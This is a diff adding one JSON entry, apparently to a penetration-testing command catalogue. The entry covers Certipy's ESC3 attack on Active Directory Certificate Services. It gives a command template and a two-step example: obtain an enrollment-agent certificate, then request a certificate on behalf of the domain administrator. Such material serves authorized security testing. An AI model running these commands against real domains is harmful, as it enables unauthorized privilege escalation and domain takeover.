@@ -1,0 +1,19 @@
+{
+  "id": "certipy-esc3",
+  "name": "Certipy ESC3 (Enrollment Agent)",
+  "command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca-name>' -template '<enrollment-agent-template>'",
+  "description": "ESC3: a template has the Certificate Request Agent EKU. Get an enrollment-agent cert, then use it to enroll on behalf of any user — typically a Domain Admin — against a template that allows enroll-on-behalf-of.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["certipy", "adcs", "esc3", "enrollment-agent"],
+  "examples": [
+    "# Step 1: get enrollment agent cert",
+    "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template EnrollmentAgent",
+    "# Step 2: use it to request a cert as administrator",
+    "certipy req -u jdoe@corp.local -p Pass -dc-ip 10.10.10.10 -ca CORP-CA -template User -on-behalf-of 'CORP\\administrator' -pfx jdoe.pfx"
+  ],
+  "references": [
+    { "title": "Certipy ESC3", "url": "https://github.com/ly4k/Certipy" }
+  ]
+}
